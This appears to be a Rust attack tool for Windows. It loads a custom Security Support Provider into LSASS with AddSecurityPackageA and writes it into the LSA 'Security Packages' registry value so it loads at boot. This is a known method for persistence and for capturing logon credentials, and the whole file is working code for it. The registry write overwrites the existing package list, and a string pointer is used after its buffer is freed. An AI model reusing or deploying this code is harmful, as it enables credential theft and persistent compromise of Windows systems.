use std::ffi::{OsString, CStr, CString};
use std::os::windows::prelude::OsStringExt;
use std::ptr::null_mut;
use std::slice;
use std::{ffi::OsStr, os::windows::prelude::OsStrExt};
use std::io::Write;
use windows::Win32::Foundation::{PSID, BOOL, LocalFree, SEC_E_OK};
use windows::Win32::Security::Authentication::Identity::{EnumerateSecurityPackagesA, SecPkgInfoA, FreeContextBuffer, SECURITY_PACKAGE_OPTIONS, SECPKG_OPTIONS_TYPE_LSA, AddSecurityPackageA};
use windows::Win32::Security::Authorization::ConvertSidToStringSidW;
use windows::Win32::Security::{SID_AND_ATTRIBUTES, SID_IDENTIFIER_AUTHORITY, AllocateAndInitializeSid, FreeSid, SECURITY_ATTRIBUTES};
use windows::Win32::System::Registry::{HKEY_LOCAL_MACHINE, HKEY, RegCreateKeyExW, KEY_ALL_ACCESS, KEY_SET_VALUE, REG_OPEN_CREATE_OPTIONS, RegSetValueExW, REG_SZ, REG_MULTI_SZ, RegSetValueExA, REG_DWORD};
use windows::{Win32::Security::Authentication::Identity::LSA_UNICODE_STRING, core::PWSTR};
use windows::core::{Result, PCSTR, PSTR, PCWSTR};
use windows::core::Error;


fn SSPtest(){
    unsafe{
        
        let mut package_count: u32 = 0;
        let mut packages= null_mut();
        let status = EnumerateSecurityPackagesA(&mut package_count, &mut packages);
        if status.is_ok() {
            let packages_ptr = packages as *const SecPkgInfoA;
            let packages_slice = std::slice::from_raw_parts(packages_ptr, package_count as usize);
            for package in packages_slice.iter() {
                let name = CStr::from_ptr(package.Name).to_string_lossy().into_owned();
                let comment = CStr::from_ptr(package.Comment).to_string_lossy().into_owned();
                println!("Name: {:?}\nComment: {:?}\n", name,comment);
            }
            FreeContextBuffer(packages as *mut _);
        }
    }
}
fn setRegisterRegs() {
    unsafe{
        let key = HKEY_LOCAL_MACHINE;
        let  IFEO_REG_KEY = r"System\CurrentControlSet\Control\Lsa";

        let subkey = OsString::from(IFEO_REG_KEY).encode_wide().chain(Some(0)).collect::<Vec<_>>().as_ptr();

        let mut hSubKey = HKEY::default();
        let ret = RegCreateKeyExW(
            key,
            PCWSTR(subkey),
            0, 
            None, 
            REG_OPEN_CREATE_OPTIONS(0), 
            KEY_ALL_ACCESS, 
            Some(null_mut()), 
            &mut hSubKey, 
            Some(null_mut()));
        let value_name = CString::new("Security Packages").unwrap();
        let value_data = CString::new("CustSSP").expect("Failed to create CString");
        let value_data_bytes = value_data.to_bytes_with_nul();

        if ret.is_ok()   {
            let ret = RegSetValueExA(
                hSubKey,
                PCSTR(value_name.as_ptr() as *const u8),
                0,
                REG_MULTI_SZ ,
                Some(value_data_bytes)
            );
            if ret.is_ok(){
                println!("[-] CreateKey Security Packages Success\n");
            }else {
                println!("[-] CreateKey Security Packages ERROR\n");
                
            }
        }else{
            println!("[-] open Security Packages ERROR\n {:?}", ret.err());
        }
    }
}
fn main(){
    let mut option: SECURITY_PACKAGE_OPTIONS = unsafe { std::mem::zeroed() };
    option.Size = std::mem::size_of::<SECURITY_PACKAGE_OPTIONS>() as u32;
    option.Flags = 0;
    option.Type = SECPKG_OPTIONS_TYPE_LSA;
    option.SignatureSize = 0;
    option.Signature = std::ptr::null_mut();

    let package_name = CString::new("mylib").unwrap();
    let package_name_pcstr: PCSTR = PCSTR(package_name.as_ptr() as *const u8);
    let result = unsafe { AddSecurityPackageA(package_name_pcstr, Some(&mut option)) };
    
    if result.is_ok(){
        println!("[*] Add security package successfully");
    }else{
        println!("[*] AddSecurityPackageA error result {:?}", result);
    }
    setRegisterRegs();
    SSPtest();
}